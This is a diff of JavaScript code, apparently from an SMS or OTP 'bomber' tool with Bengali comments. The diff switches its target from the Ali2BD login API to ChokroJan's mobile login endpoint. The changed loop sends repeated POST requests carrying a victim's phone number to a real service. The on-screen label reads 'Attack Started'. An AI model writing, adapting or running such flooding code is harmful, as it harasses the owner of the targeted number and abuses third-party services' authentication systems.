@@ -33,18 +33,18 @@ async function startProcess() {
         return;
     }
 
-    display.innerText = "Ali2BD Attack Started...";
+    display.innerText = "ChokroJan Attack Started...";
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // আপনার নিজের খুঁজে বের করা Ali2BD POST API
-            await fetch('https://ali2bd-api.service.moveo.global/api/consumer/v1/auth/login', {
+            // আপনার নিজের খুঁজে বের করা ChokroJan POST API
+            await fetch('https://chokrojan.com/api/v1/passenger/login/mobile', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    "username": "+88" + target // Ali2BD এ নম্বর +88 সহ দিতে হয়
+                    "mobile_number": target // ChokroJan এ শুধু নম্বর দিলেই হয়
                 }),
                 mode: 'cors'
             });
